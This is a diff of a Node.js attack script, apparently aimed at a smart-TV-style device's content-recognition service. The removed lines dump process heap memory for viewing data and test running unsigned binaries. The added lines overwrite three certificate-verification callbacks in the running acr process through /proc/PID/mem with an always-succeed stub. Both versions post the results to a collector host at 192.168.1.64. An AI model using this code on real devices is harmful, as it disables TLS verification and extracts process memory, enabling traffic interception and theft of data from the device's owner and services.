@@ -1,40 +1,81 @@
 "use strict";
-var fs = require("fs");
+// audit83.js - start acr if needed, then patch ALL THREE verify callbacks.
+// 1. acr VA 0x96c08 (AcrControlVerifyCertCallback)
+// 2. acr VA 0x97c84 (lws_VerifyCertCallback)
+// 3. libVDCurl base+0xBC24 (VDCurl::VDCurlOperation::m_verifyCertCallback)
 var http = require("http");
 var cp = require("child_process");
+var HOST = "192.168.1.64";
+var PORT = 9999;
 
 function post(path, body) {
     var data = JSON.stringify(body);
-    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
+    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
         headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
-        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
-    req.on("error", function (e) { console.log("post err " + path + " " + e.message); });
+        function (res) { try { res.resume(); } catch (e) {} });
+    req.on("error", function () {});
     req.write(data);
     req.end();
 }
-
 function sh(cmd, cap) {
-    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 20000 }).slice(0, cap || 8000); }
+    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 20000 }).slice(0, cap || 6000); }
     catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
 }
+function trim(s) { return (s || "").trim(); }
 
 var out = {};
 out.started = new Date().toISOString();
-var SDK = "/home/owner/share/tmp/sdk_tools";
 
-// 1. exec test: can a pushed unsigned ARM binary run?
-sh("rm -f /opt/usr/exectest_ok");
-out.exec_direct = sh("chmod +x " + SDK + "/exectest; " + SDK + "/exectest; echo rc=$?");
-out.exec_marker = sh("cat /opt/usr/exectest_ok 2>&1");
-out.exec_memfd = sh("cp " + SDK + "/exectest /dev/shm/exectest 2>&1; /dev/shm/exectest 2>&1; echo rc=$?; cat /opt/usr/exectest_ok 2>&1");
+// 1. service state + start
+out.svc = sh("systemctl status acr.service --no-pager 2>&1 | head -12", 1200);
+if (out.svc.indexOf("active (running)") < 0) {
+    out.start = sh("systemctl start acr.service 2>&1; echo RC=$?", 300);
+    sh("sleep 4", 100);
+}
 
-// 2. heap visibility: where are the readable rw regions of the OCR/acr processes?
-out.maps_ocr = sh("grep -E 'rw|heap' /proc/1394/maps | head -12");
-out.maps_acr = sh("grep -E 'rw|heap' /proc/1962/maps | head -12");
+out.pidof = sh("pidof acr", 200);
+var pid = null;
+var pm = trim(out.pidof).match(/^(\d+)/);
+if (pm) pid = pm[1];
+if (!pid) {
+    out.spawn = sh("nohup /usr/bin/acr >/dev/null 2>&1 & echo SPAWNED", 150);
+    sh("sleep 4", 100);
+    out.pidof = sh("pidof acr", 200);
+    pm = trim(out.pidof).match(/^(\d+)/);
+    if (pm) pid = pm[1];
+}
+out.pid = pid;
 
-// 3. sample strings from the OCR service heap (raw text?) and acr heap (JSON payload?)
-out.ocr_heap_strings = sh("for seg in $(awk '/heap|\\[anon/ {split($1,a,\"-\"); print strtonum(\"0x\"a[1])\" \"strtonum(\"0x\"a[2])}' /proc/1394/maps | head -8); do set -- $seg; dd if=/proc/1394/mem bs=4096 skip=$(( $1 / 4096 )) count=$(( ( $2 - $1 ) / 4096 )) 2>/dev/null; done | strings -n 4 | head -60", 6000);
-out.acr_heap_strings = sh("for seg in $(awk '/heap|\\[anon/ {split($1,a,\"-\"); print strtonum(\"0x\"a[1])\" \"strtonum(\"0x\"a[2])}' /proc/1962/maps | head -8); do set -- $seg; dd if=/proc/1962/mem bs=4096 skip=$(( $1 / 4096 )) count=$(( ( $2 - $1 ) / 4096 )) 2>/dev/null; done | strings -n 6 | grep -E '\\{|channelName|programId|psid|contentId|recog|title|Title' | head -25", 5000);
+if (!pid) {
+    out.status = "NO_ACR_PID";
+    post("/p83_diag", out);
+    post("/p83_done", { started: out.started });
+} else {
+    out.maps = sh("cat /proc/" + pid + "/maps | grep -E 'acr|VDCurl|libssl|bonfire' | head -20", 3000);
+    var vdBase = null;
+    out.maps.split("\n").forEach(function (L) {
+        var m = L.match(/^([0-9a-f]+)-[0-9a-f]+ r-xp 00000000 .*libVDCurl/);
+        if (m && !vdBase) vdBase = parseInt(m[1], 16);
+    });
+    out.vd_base = vdBase ? "0x" + vdBase.toString(16) : "NOT_FOUND";
 
-post("/ocr_probe3", out);
-post("/ocr_probe3_done", { started: out.started });
+    sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub", 100);
+    var T = [
+        { name: "AcrControlVerifyCertCallback", addr: 0x96c08 },
+        { name: "lws_VerifyCertCallback", addr: 0x97c84 }
+    ];
+    if (vdBase) T.push({ name: "VDCurl_m_verifyCertCallback", addr: vdBase + 0xBC24 });
+
+    var res = [];
+    T.forEach(function (t) {
+        var dec = t.addr;
+        var before = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
+        var wr = trim(sh("dd if=/tmp/.p80stub of=/proc/" + pid + "/mem bs=1 seek=" + dec + " count=4 conv=notrunc 2>&1 | tail -1", 120));
+        var after = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
+        res.push({ name: t.name, addr: "0x" + t.addr.toString(16), before: before, write: wr, after: after,
+                   ok: after.indexOf("01 20 70 47") >= 0 });
+    });
+    out.patch = res;
+    post("/p83_patch", out);
+    post("/p83_done", { started: out.started });
+}
